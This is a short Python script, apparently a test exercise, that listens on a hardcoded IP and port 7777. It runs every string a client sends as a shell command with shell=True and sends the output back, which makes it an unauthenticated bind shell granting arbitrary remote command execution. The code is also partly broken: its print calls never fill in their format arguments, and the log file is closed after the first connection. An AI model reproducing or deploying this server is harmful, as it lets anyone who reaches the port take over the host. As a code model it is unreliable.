import socket
import subprocess

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

local_hostname = socket.gethostname()

localfqdn = socket.getfqdn()

ip_address = socket.gethostbyname("")

print("This is the ip_address of server: ", ip_address)

print("This is a test with %s (%s), at %s", (local_hostname, localfqdn, ip_address))

server_address = ("133.11.164.143", 7777)

print("Attempting to bind to the %s", server_address)
sock.bind(server_address)

sock.listen(2)
file = open("testSocketData.dat", "w")
#fileContents = ""
while True:
    print("Currently waiting for a connection")
    connection, client_address = sock.accept()

    try:
        print("Connection from %s", client_address)
        print("Connection is of type: ", type(connection))
        print("client_address is of type: ", type(client_address))
        # receive the data in small chunks and print it
        while True:
            data =  connection.recv(1024)
            dat = data.decode("utf-8")
            print(dat)
            if data:
                # output received data
                op = subprocess.Popen(dat, shell=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
                print("after op")
                fileContents = op.stdout.read()
                print("after fileContents")
                print("Output: %s" % fileContents.decode("utf-8"))
                connection.send(fileContents)
                file.write(fileContents.decode("utf-8"))
                #break
            else:
                # no more data -- quit the loop
                print ("here")
                print ("no more data.")
                print ("----------------\n")
                break
    finally:
        # Clean up the connection
        connection.close()
        file.close()
sock.close()
